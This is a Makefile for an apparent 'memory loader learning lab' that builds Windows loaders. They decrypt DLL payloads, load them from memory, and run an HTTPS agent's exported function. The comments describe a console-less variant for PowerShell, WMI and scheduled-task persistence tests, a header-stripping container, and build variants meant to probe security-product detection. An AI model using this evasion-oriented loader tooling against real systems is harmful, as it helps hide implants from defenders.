# Memory loader learning lab Makefile.
# It builds a benign hello DLL plus loaders:
# 1) loader_plain.x64.exe: memory-loads the DLL bytes directly.
# 2) loader_encrypted.x64.exe: decrypts hello_payload.x64.bin, then memory-loads the DLL.
# 3) loader_agentdll_encrypted.x64.exe: decrypts a direct_https DLL probe bin,
#    memory-loads it, and calls its exported RunAgentDll() function.
# 4) loader_agentdll_quiet.x64.exe: same direct_https DLL loader, but without
#    console/debug output; intended for PowerShell Start-Process survival tests.
# 5) loader_agentdll_mmpp_lite.x64.exe: direct_https DLL loader using the
#    MemoryModulePP_Lite API path for MemoryModulePP-style experiments.
# 6) loader_profile_only*.x64.exe + cache.dhpl: only load the current
#    direct_https_profile DLL from a DHPL1 custom container, without keeping
#    DOS/NT/section headers in the mapped image.

ARCH ?= x64
KEY ?= CHANGE_ME_MEMORY_LOADER_KEY

# 交叉编译器：在 Linux 上生成 Windows x64 程序。
CC_X64 := x86_64-w64-mingw32-gcc
STRIP_X64 := x86_64-w64-mingw32-strip

# 构建输出目录，例如 build/x64。
BUILD := build/$(ARCH)
PROFILE_DLL ?= $(BUILD)/direct_https_profile.x64.dll
PROFILE_CONTAINER ?= $(BUILD)/cache.dhpl

# 两套内存加载实现：
# MM   = 经典 MemoryModule，用于早期 baseline；
# MMPP = 本轮重点 MemoryModulePP_Lite，用于 full API direct_https 内存加载。
MM := third_party/MemoryModule
MMPP := third_party/MemoryModulePP_Lite

# -Os：尽量小体积；-I：加入两个 loader 头文件目录；
# EXTRA_CFLAGS：保留给临时实验宏使用，不直接写死在 Makefile。
BASE_CFLAGS := -Wall -Wextra -I$(MM) -I$(MMPP) $(EXTRA_CFLAGS)
OPT_CFLAGS ?= -Os
CFLAGS := $(OPT_CFLAGS) $(BASE_CFLAGS)
LDFLAGS := -static -s
LDFLAGS_NOSTRIP := -static

.PHONY: all clean x64 agent-loader quiet-loader mmp-loader profile-container profile-loader profile-loader-diag profile-loader-release-variants
all: x64

# x64 默认目标：构建 hello payload 和几种学习 loader。
x64: $(BUILD)/hello_payload.x64.dll $(BUILD)/loader_plain.x64.exe $(BUILD)/loader_encrypted.x64.exe $(BUILD)/loader_agentdll_encrypted.x64.exe $(BUILD)/hello_payload.x64.bin

# 下面三个目标是为了单独重编某一种 loader，避免每次全量构建。
agent-loader: $(BUILD)/loader_agentdll_encrypted.x64.exe

quiet-loader: $(BUILD)/loader_agentdll_quiet.x64.exe

mmp-loader: $(BUILD)/loader_agentdll_mmpp_lite.x64.exe

profile-container: | $(BUILD)
	python3 pack_profile_container.py $(PROFILE_DLL) $(PROFILE_CONTAINER) $(KEY) > $(BUILD)/pack_profile_container.log

profile-loader: $(BUILD)/loader_profile_only.x64.exe

profile-loader-diag: $(BUILD)/loader_profile_only_diag.x64.exe

profile-loader-release-variants: \
	$(BUILD)/loader_profile_only_release_markers.x64.exe \
	$(BUILD)/loader_profile_only_release_nostrip.x64.exe \
	$(BUILD)/loader_profile_only_release_o0.x64.exe \
	$(BUILD)/loader_profile_only_release_o1.x64.exe

# 确保输出目录存在。
$(BUILD):
	mkdir -p $(BUILD)

# 编译经典 MemoryModule 对象文件。
$(BUILD)/MemoryModule.x64.o: $(MM)/MemoryModule.c $(MM)/MemoryModule.h | $(BUILD)
	$(CC_X64) $(CFLAGS) -c $< -o $@

# 编译本轮重点 MemoryModulePP_Lite 对象文件。
$(BUILD)/MemoryModulePP_Lite.x64.o: $(MMPP)/MemoryModulePP_Lite.c $(MMPP)/MemoryModulePP_Lite.h | $(BUILD)
	$(CC_X64) $(CFLAGS) -c $< -o $@

# 构建无害 hello DLL，用来学习“DLL 从内存加载后导出函数能否被调用”。
$(BUILD)/hello_payload.x64.dll: src/hello_payload.c | $(BUILD)
	$(CC_X64) $(CFLAGS) -shared $< -o $@ -Wl,--out-implib,$(BUILD)/libhello_payload.a $(LDFLAGS)

# 构建明文 DLL loader：直接加载 hello_payload.x64.dll。
$(BUILD)/loader_plain.x64.exe: src/loader_plain.c $(BUILD)/MemoryModule.x64.o | $(BUILD)
	$(CC_X64) $(CFLAGS) $^ -o $@ $(LDFLAGS)

# 构建 XOR bin loader：先解密 hello_payload.x64.bin 再加载。
$(BUILD)/loader_encrypted.x64.exe: src/loader_encrypted.c $(BUILD)/MemoryModule.x64.o | $(BUILD)
	$(CC_X64) $(CFLAGS) $^ -o $@ $(LDFLAGS)

# 构建早期 direct_https DLL loader：带控制台输出，适合调试。
$(BUILD)/loader_agentdll_encrypted.x64.exe: src/loader_agentdll_encrypted.c $(BUILD)/MemoryModule.x64.o | $(BUILD)
	$(CC_X64) $(CFLAGS) $^ -o $@ $(LDFLAGS)

# 构建 quiet direct_https DLL loader：不弹控制台，适合 PowerShell/WMI/计划任务测试。
$(BUILD)/loader_agentdll_quiet.x64.exe: src/loader_agentdll_quiet.c $(BUILD)/MemoryModule.x64.o | $(BUILD)
	$(CC_X64) $(CFLAGS) $^ -o $@ $(LDFLAGS) -mwindows

# 构建本轮重点 loader：使用 MemoryModulePP_Lite 手动映射 direct_https DLL。
$(BUILD)/loader_agentdll_mmpp_lite.x64.exe: src/loader_agentdll_mmpp_lite.c $(BUILD)/MemoryModulePP_Lite.x64.o | $(BUILD)
	$(CC_X64) $(CFLAGS) $^ -o $@ $(LDFLAGS) -mwindows

# 构建专有 DHPL1 profile-only loader：不在运行时解析完整 PE header/export table。
$(BUILD)/loader_profile_only_diag.x64.exe: src/loader_profile_only.c | $(BUILD)
	$(CC_X64) $(CFLAGS) -DPROFILE_ONLY_DIAG $< -o $@ $(LDFLAGS) -mwindows -lbcrypt

$(BUILD)/loader_profile_only.x64.exe: src/loader_profile_only.c | $(BUILD)
	$(CC_X64) $(CFLAGS) -DPROFILE_ONLY_RELEASE $< -o $@ $(LDFLAGS) -mwindows -lbcrypt

# R01: release 逻辑不变，仅加入少量 diag 风格状态字符串，验证字符串/布局扰动。
$(BUILD)/loader_profile_only_release_markers.x64.exe: src/loader_profile_only.c | $(BUILD)
	$(CC_X64) $(CFLAGS) -DPROFILE_ONLY_RELEASE -DPROFILE_ONLY_RELEASE_MARKERS $< -o $@ $(LDFLAGS) -mwindows -lbcrypt

# R02: release 逻辑不变，但取消 -s/strip，验证 PE 符号/节信息和文件形态影响。
$(BUILD)/loader_profile_only_release_nostrip.x64.exe: src/loader_profile_only.c | $(BUILD)
	$(CC_X64) $(CFLAGS) -DPROFILE_ONLY_RELEASE $< -o $@ $(LDFLAGS_NOSTRIP) -mwindows -lbcrypt

# R03: release 逻辑不变，改用 -O0，验证 -Os 优化后的代码形状是否参与检测。
$(BUILD)/loader_profile_only_release_o0.x64.exe: src/loader_profile_only.c | $(BUILD)
	$(CC_X64) -O0 $(BASE_CFLAGS) -DPROFILE_ONLY_RELEASE $< -o $@ $(LDFLAGS) -mwindows -lbcrypt

# R04: release 逻辑不变，改用 -O1，作为 -Os 与 -O0 之间的优化等级对照。
$(BUILD)/loader_profile_only_release_o1.x64.exe: src/loader_profile_only.c | $(BUILD)
	$(CC_X64) -O1 $(BASE_CFLAGS) -DPROFILE_ONLY_RELEASE $< -o $@ $(LDFLAGS) -mwindows -lbcrypt

# 把 hello DLL XOR 打包成 bin，用来学习“磁盘放 bin、运行时还原 DLL”。
$(BUILD)/hello_payload.x64.bin: $(BUILD)/hello_payload.x64.dll pack_xor.py
	python3 pack_xor.py $< $@ $(KEY) > $(BUILD)/pack_xor.log

# 清理实验构建产物。
clean:
	rm -rf build
